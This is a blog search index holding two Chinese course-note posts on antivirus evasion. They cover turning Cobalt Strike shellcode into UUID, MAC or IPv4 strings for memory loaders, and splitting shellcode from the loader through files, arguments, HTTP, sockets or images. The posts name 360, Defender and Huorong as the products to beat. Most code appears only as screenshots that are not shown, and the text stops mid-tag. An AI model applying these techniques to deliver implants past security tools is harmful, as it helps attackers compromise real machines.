<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</title>
      <link href="/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/"/>
      <url>/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/HiSMs9ojCRUMQ2C40-fBqQ.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、内存加载-UUID地址-ShellCode转换</p><p>2、内存加载-MAC地址-ShellCode转换</p><p>3、内存加载-IPV4地址-ShellCode转换</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h5 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h5><p>X60 Defender 某绒 管家 VT等</p><h5 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h5><p>C&#x2F;C++ Python C# Go Powershell Ruby Java ASM NIM Vlang等。</p><h5 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h5><p>ShellCode混淆，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/Nn-mppar3bb7YDktbGdnAA.png" alt="img"></p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><em>演示案例：</em></h3><h4 id="➢-内存加载-UUID地址-ShellCode-转换"><a href="#➢-内存加载-UUID地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-UUID地址-ShellCode**转换"></a>➢ <em>内存加载-UUID地址-ShellCode**转换</em></h4><h4 id="➢-内存加载-MAC地址-ShellCode-转换"><a href="#➢-内存加载-MAC地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-MAC地址-ShellCode**转换"></a>➢ <em>内存加载-MAC地址-ShellCode**转换</em></h4><h4 id="➢-内存加载-IPV4地址-ShellCode-转换"><a href="#➢-内存加载-IPV4地址-ShellCode-转换" class="headerlink" title="➢ 内存加载-IPV4地址-ShellCode**转换"></a>➢ <em>内存加载-IPV4地址-ShellCode**转换</em></h4></blockquote><h5 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h5><p><a href="https://www.anquanke.com/post/id/262666">CS shellcode内存加载器免杀及实现-安全客 - 安全资讯平台 (anquanke.com)</a></p><h6 id="之前的是将shellcode写入内存，本节课是封装好shellcod写入内存"><a href="#之前的是将shellcode写入内存，本节课是封装好shellcod写入内存" class="headerlink" title="之前的是将shellcode写入内存，本节课是封装好shellcod写入内存"></a>之前的是将shellcode写入内存，本节课是封装好shellcod写入内存</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512144512182.png" alt="image-20230512144512182"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162055001.png" alt="image-20230512162055001"></p><h3 id="内存加载-UUID方式-ShellCode转换"><a href="#内存加载-UUID方式-ShellCode转换" class="headerlink" title="#内存加载-UUID方式-ShellCode转换"></a>#内存加载-UUID方式-ShellCode转换</h3><p>通用唯一识别码(UUID),是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。</p><h6 id="演示加载语言：C-C-Python2-Go"><a href="#演示加载语言：C-C-Python2-Go" class="headerlink" title="演示加载语言：C++ C# Python2 Go"></a>演示加载语言：C++ C# Python2 Go</h6><h6 id="生成两个位数的文件"><a href="#生成两个位数的文件" class="headerlink" title="生成两个位数的文件"></a>生成两个位数的文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512154730691.png" alt="image-20230512154730691"></p><h6 id="利用python脚本将shellcode转化成uuid的字符串，将payload-c里面的shellcode替换到此处"><a href="#利用python脚本将shellcode转化成uuid的字符串，将payload-c里面的shellcode替换到此处" class="headerlink" title="利用python脚本将shellcode转化成uuid的字符串，将payload.c里面的shellcode替换到此处"></a>利用python脚本将shellcode转化成uuid的字符串，将payload.c里面的shellcode替换到此处</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155226978.png" alt="image-20230512155226978"></p><h6 id="执行打印出shellcode的uuid字符串"><a href="#执行打印出shellcode的uuid字符串" class="headerlink" title="执行打印出shellcode的uuid字符串"></a>执行打印出shellcode的uuid字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155400752.png" alt="image-20230512155400752"></p><h6 id="上面的链接中给出了用：C-C-Python2-Go写的uuid加载内存的代码"><a href="#上面的链接中给出了用：C-C-Python2-Go写的uuid加载内存的代码" class="headerlink" title="上面的链接中给出了用：C++ C# Python2 Go写的uuid加载内存的代码"></a>上面的链接中给出了用：C++ C# Python2 Go写的uuid加载内存的代码</h6><h5 id="1、C-："><a href="#1、C-：" class="headerlink" title="1、C++："></a>1、C++：</h5><h6 id="将生成的uuid的shellcode字符串写到此处"><a href="#将生成的uuid的shellcode字符串写到此处" class="headerlink" title="将生成的uuid的shellcode字符串写到此处"></a>将生成的uuid的shellcode字符串写到此处</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155740713.png" alt="image-20230512155740713"></p><h6 id="尝试执行成功上线"><a href="#尝试执行成功上线" class="headerlink" title="尝试执行成功上线"></a>尝试执行成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512155907968.png" alt="image-20230512155907968"></p><h6 id="生成exe文件"><a href="#生成exe文件" class="headerlink" title="生成exe文件"></a>生成exe文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160038610.png" alt="image-20230512160038610"></p><h5 id="2、C"><a href="#2、C" class="headerlink" title="2、C#"></a>2、C#</h5><h6 id="同样生成uuid的shellcode字符串"><a href="#同样生成uuid的shellcode字符串" class="headerlink" title="同样生成uuid的shellcode字符串"></a>同样生成uuid的shellcode字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160454999.png" alt="image-20230512160454999"></p><h6 id="同样在上线C-代码中替换掉shellcode"><a href="#同样在上线C-代码中替换掉shellcode" class="headerlink" title="同样在上线C#代码中替换掉shellcode"></a>同样在上线C#代码中替换掉shellcode</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160626649.png" alt="image-20230512160626649"></p><h5 id="3、python2"><a href="#3、python2" class="headerlink" title="3、python2"></a>3、python2</h5><h6 id="python可以直接将pyload-c里面的shellcode替换到python的uuid转换代码中"><a href="#python可以直接将pyload-c里面的shellcode替换到python的uuid转换代码中" class="headerlink" title="python可以直接将pyload.c里面的shellcode替换到python的uuid转换代码中"></a>python可以直接将pyload.c里面的shellcode替换到python的uuid转换代码中</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160823185.png" alt="image-20230512160823185"></p><h6 id="执行脚本转换"><a href="#执行脚本转换" class="headerlink" title="执行脚本转换"></a>执行脚本转换</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512160951948.png" alt="image-20230512160951948"></p><h6 id="将其上面shellcode的uuid字符串复制到执行上线的代码里面"><a href="#将其上面shellcode的uuid字符串复制到执行上线的代码里面" class="headerlink" title="将其上面shellcode的uuid字符串复制到执行上线的代码里面"></a>将其上面shellcode的uuid字符串复制到执行上线的代码里面</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161352812.png" alt="image-20230512161352812"></p><h6 id="执行代码，未上线，是因为用的是Python3版本"><a href="#执行代码，未上线，是因为用的是Python3版本" class="headerlink" title="执行代码，未上线，是因为用的是Python3版本"></a>执行代码，未上线，是因为用的是Python3版本</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161556634.png" alt="image-20230512161556634"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161737140.png" alt="image-20230512161737140"></p><h6 id="换成python2版本执行成功上线"><a href="#换成python2版本执行成功上线" class="headerlink" title="换成python2版本执行成功上线"></a>换成python2版本执行成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161848313.png" alt="image-20230512161848313"></p><h6 id="用Pyinstaller打包exe"><a href="#用Pyinstaller打包exe" class="headerlink" title="用Pyinstaller打包exe"></a>用Pyinstaller打包exe</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512161949933.png" alt="image-20230512161949933"></p><h6 id="由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了"><a href="#由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了" class="headerlink" title="由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了"></a>由于打包后很容易就被杀了，结合上节内容，分离出shellcode后重新打包不会被杀了</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162557113.png" alt="image-20230512162557113"></p><h5 id="4、GO语言："><a href="#4、GO语言：" class="headerlink" title="4、GO语言："></a>4、GO语言：</h5><h6 id="生成shellcode的uuid字符串"><a href="#生成shellcode的uuid字符串" class="headerlink" title="生成shellcode的uuid字符串"></a>生成shellcode的uuid字符串</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512162845095.png" alt="image-20230512162845095"></p><h6 id="替换到go的上线执行代码中"><a href="#替换到go的上线执行代码中" class="headerlink" title="替换到go的上线执行代码中"></a>替换到go的上线执行代码中</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163007961.png" alt="image-20230512163007961"></p><h6 id="运行后成功上线"><a href="#运行后成功上线" class="headerlink" title="运行后成功上线"></a>运行后成功上线</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163049294.png" alt="image-20230512163049294"></p><h6 id="执行命令编译成exe文件"><a href="#执行命令编译成exe文件" class="headerlink" title="执行命令编译成exe文件"></a>执行命令编译成exe文件</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163123250.png" alt="image-20230512163123250"></p><p>发现将其放到虚拟机里面执行后无法上线，因为执行代码里面检测cpu核数和物理内存</p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163806607.png" alt="image-20230512163806607"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163328120.png" alt="image-20230512163328120"></p><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163833529.png" alt="image-20230512163833529"></p><h6 id="先直接把main函数执行这两个地方的代码注释后重新打包"><a href="#先直接把main函数执行这两个地方的代码注释后重新打包" class="headerlink" title="先直接把main函数执行这两个地方的代码注释后重新打包"></a>先直接把main函数执行这两个地方的代码注释后重新打包</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512163930294.png" alt="image-20230512163930294"></p><h6 id="再次执行exe就成功上线了"><a href="#再次执行exe就成功上线了" class="headerlink" title="再次执行exe就成功上线了"></a>再次执行exe就成功上线了</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164303212.png" alt="image-20230512164303212"></p><h6 id="上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）"><a href="#上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）" class="headerlink" title="上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）"></a>上面虚拟机执行不了，跟加了反调试反虚拟机原理一样的，可以用之前的软件添加反虚拟机（但是这个软件特征太明显，会被查杀）</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164400258.png" alt="image-20230512164400258"></p><h6 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h6><p><img src="/../images/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/image-20230512164448705.png" alt="image-20230512164448705"></p><h3 id="内存加载-MAC地址-ShellCode转换"><a href="#内存加载-MAC地址-ShellCode转换" class="headerlink" title="#内存加载-MAC地址-ShellCode转换"></a>#内存加载-MAC地址-ShellCode转换</h3><p>MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的。</p><p>演示加载语言：Python2 Go</p><h3 id="内存加载-IPV4方式-ShellCode转换"><a href="#内存加载-IPV4方式-ShellCode转换" class="headerlink" title="#内存加载-IPV4方式-ShellCode转换"></a>#内存加载-IPV4方式-ShellCode转换</h3><p>IPv4是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽最大努力交付数据包，意即它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4使用32位（4字节）地址。</p><p>演示加载语言：Go</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</title>
      <link href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/"/>
      <url>/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/8i3IGPgDn9GeJQ6a1zq34Q.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、无文件落地&amp;分离拆分-将shellcode从文本中提取-file</p><p>2、无文件落地&amp;分离拆分-将shellcode与加载器分离-argv</p><p>3、无文件落地&amp;分离拆分-将shellcode远程协议加载-http</p><p>4、无文件落地&amp;分离拆分-将shellcode通过管道传输-socket</p><p>5、无文件落地&amp;分离拆分-将shellcode隐写进图片内-images</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Python-File-将shellcode从文本中提取"><a href="#➢-Python-File-将shellcode从文本中提取" class="headerlink" title="➢ Python-File-将shellcode从文本中提取"></a>➢ Python-File-将shellcode从文本中提取</h4><h4 id="➢-Python-Argv-将shellcode与加载器分离"><a href="#➢-Python-Argv-将shellcode与加载器分离" class="headerlink" title="➢ Python-Argv-将shellcode与加载器分离"></a>➢ Python-Argv-将shellcode与加载器分离</h4><h4 id="➢-Python-Http-将shellcode用远程协议加载"><a href="#➢-Python-Http-将shellcode用远程协议加载" class="headerlink" title="➢ Python-Http-将shellcode用远程协议加载"></a>➢ Python-Http-将shellcode用远程协议加载</h4><h4 id="➢-Python-Socket-将shellcode通过管道传输"><a href="#➢-Python-Socket-将shellcode通过管道传输" class="headerlink" title="➢ Python-Socket-将shellcode通过管道传输"></a>➢ Python-Socket-将shellcode通过管道传输</h4><h4 id="➢-Python-Images-将shellcode隐写进图片内"><a href="#➢-Python-Images-将shellcode隐写进图片内" class="headerlink" title="➢ Python-Images-将shellcode隐写进图片内"></a>➢ Python-Images-将shellcode隐写进图片内</h4></blockquote><blockquote><p>内存免杀是将shellcode直接加载进内存，由于没有文件落地，因此可以绕过文件扫描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。分离免杀包含对特征和行为的分离两个维度，把shellcode从放在程序转移到加载进内存，把整块的shellcode通过分块传输的方法上传然后再拼接，这些体现了基本的”分离“思想。</p></blockquote><h3 id="Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）"><a href="#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）" class="headerlink" title="#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）"></a>#Python-File-将shellcode从文本中提取（全绕过）（上线exe为仅接收shellcode的程序）</h3><blockquote><h5 id="python读取文件："><a href="#python读取文件：" class="headerlink" title="python读取文件："></a>python读取文件：</h5><p>with open(‘s.txt’,’r’) as f:</p><p>​    s&#x3D;f.read()</p></blockquote><h6 id="1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线"><a href="#1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线" class="headerlink" title="1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线"></a>1、首先生成原始c文件获取里面的shellcode，这里需要注意的是：自己的python是多少位，这里的payload就选择多少位，要不然将会无法上线</h6><p><img 